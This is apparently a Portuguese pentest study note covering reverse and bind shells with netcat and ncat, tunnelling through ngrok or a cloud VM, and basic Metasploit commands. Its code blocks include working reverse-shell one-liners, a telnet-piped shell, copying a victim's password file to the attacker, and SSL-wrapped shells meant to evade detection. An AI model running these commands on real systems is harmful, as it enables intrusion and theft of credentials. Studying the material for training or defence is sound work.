<span style="color: #d65d0e">reverse shell</span> (conexão reversa) <span style="color: #3588E9">--></span> a máquina do atacante se comporta como servidor (precisa de engenharia social). Nesse caso a vítima irá acessar a máquina do atacante.

<span style="color: #d65d0e">bind shell</span> (conexão direta) <span style="color: #3588E9">--></span> é quando a máquina de destino abre uma porta que permite que o atacante conecte e acesse os comandos de um SO (backdoor). Nesse caso a máquina da vitima funciona como um servidor, pois é ela que esta escutando em uma determinada porta. Entretanto, firewall pode proibir máquinas alvo de abrir uma porta.
###### <strong style="color:#689d6a">Necat</strong>:

substituto do Telnet, esta disponível na maioria das distribuições do Linux.

```bash
sudo nc -h # retorna as opções do netcat

# Para se conectar a uma porta de algum serviço
sudo nc 192.168.0.38 80 # captura de banner

# Abre uma porta em modo verbose
sudo nc -l -p 1000 -v 
sudo nc 192.168.0.38 1000

# executa um shell na porta
sudo nc -l -p 2000 -e /bin/bash -v
```

- Para <strong>obter</strong> uma <span style="color: #d65d0e">conexão reversa</span> de alguém que estiver <strong>fora da rede local</strong>, há algumas formas:
	- configurar no roteador o redireciamnento de porta (port fowarding) apontando as portas para endereço IP da máquina Kali.
	- configurar no roteador o DMZ Host apontando para  o IP da máquina Kali, mas para que funcionem deve se utilizar um <span style="color: #d65d0e">DNS dinâmico</span> <span style="color: #3588E9">--></span> a aplicação <a href="https://www.noip.com/"><span style="color: #98971a">NoIP</span></a> permite criar um DNS dinâmico e funciona como um utilitário no sistemas operacional.
	- criar um VM na <a href="https://aws.amazon.com/lightsail/"><span style="color: #98971a">Amazon Lightsail</span></a>, é uma alternativa para DNS dinâmico, mas um IP fixo deve ser criado. É uma boa opção para pentest comercial.
	- criar conta no <a href="https://ngrok.com/"><span style="color: #98971a">ngrok</span></a> <span style="color: #3588E9">--></span> realiza um túnel entre uma porta aberta na minha máquina e o endereço na internet fornecido pelo ngrok.

```bash
# como usar o ngrook
./ngrook tcp 3500
nc 0.tcp.ngrook.io 15560

# conexao reversa
sudo nc -nlp 3000 -v
nc 192.168.0.38 3000 -e /bin/bash # conexão da vitima no linux
nc 192.168.0.38 3000 -e c:\windows\system32\cmd.exe # conexão da vitima no windows

# conexao reversa sem o cliente ter o netcat, não funciona no Windows
sudo nc -vnlp 3000 # atacante
sudo nc -vnlp 2000 # atacante
telnet 192.168.0.107 3000 | /bin/bash | telnet 192.168.0.107 2000 # vítima 

# copiar arquivos da máquina da vitima para a do atacante:
sudo nc -vnlp 1500 > senhas.txt # atacante
nc 192.168.0.107 1500 < senhas.txt # vitima

## Para burlar IDS com cryptcat
# copiar o crypcat para outra máquina:
nc - vlnp 1500 < cryptcat
nc 192.168.0.107 1500 > cryptcat
```

O <span style="color: #98971a">Ncat</span> é o netcat melhorado, ele permite o uso de SSL para burlar ips e sistemas de detecção em geral. Ele é uma alternativa ao cryptcat e foi desenvolvido pela equipe do nmap.

```bash
# gerar o certitificado com openssl
openssl req -new -newkey rsa:4096 -nodes -keyout teste.key -out teste.csr
# req -new -newkey rsa:4096 --> gera nova chave  
# -keyout teste.key --> arquivo que vai contar a chave privada
# -out teste.csr --> requisicao de certiciado

# modo listening 
ncat -l -v -p 443 -e '/bin/bash -i' --ssl --ssl-cert teste.pem -ssl-sslkey teste.key # simula um SSL por isso o uso da porta 443
nc -C --ssl 192.168.11.112 443 # na máquina da vitima
```
###### <strong style="color:#689d6a">Metasploit Framework</strong>:

<span style="color: #3588E9">--></span> exploit era o programa que basicamente iria achar o endereço na memoria do overflow e executaria o payload para ganhar o acesso.

O <span style="color: #98971a">metasploit</span> possibilitou uma revolução na forma de fazer penetration testing, os scripts são todos baseados em python, é fácil fazer uma extensão. Ele é integrado ao postgre sql e todos os exploit são codificados em Ruby.

- <strong style="color:#b16286">Metasploit Structure</strong>:
	- local do metasploit <span style="color: #3588E9">--></span> <code><span style="color:#98971a"> /usr/share/metasploit-framework/</span></code>
	- <code><span style="color:#689d6a">$ msfpescan</span></code> <span style="color: #3588E9">--></span> ajuda a fazer aplicativos executáveis do windows
---

- <strong style="color:#b16286">Metasploit Basic Commands</strong>:
	- executa o metasploit no terminal
		- `sudo msfconsole`
	- atualiza o metasploit
		- `sudo msfupdate`
	- lista o comandos disponíveis
		- `msf6 > ?`
	- lista of payloads disponíveis
		- `msf6 > show payloads`
	- lista os exploits disponíveis
		- `msf6 > show exploits`
	- retorna ajuda de um comando
		- `msf6 > db_export -h`
	- usando o db_import
		- `nmap -A -oX resultados.mxl 192.168.0.0-12` --> para exportar o resultados do scan em arquivo
		- `msf6 > db_import / resultados.xml` --> irá importar os dados para a base de dados do metasploit
	- roda o nmap no metasploit
		- `db_nmap -A 192.168.1.1`
	- to use and exploit
		- `msf6 > use exploit/<exploit_name>`
		  `show info` --> exibe informações sobre o exploit selecionado
		  `show options` --> exibe as opções para o exploit
## **Post Exploitation**
## **Wireless Hacking**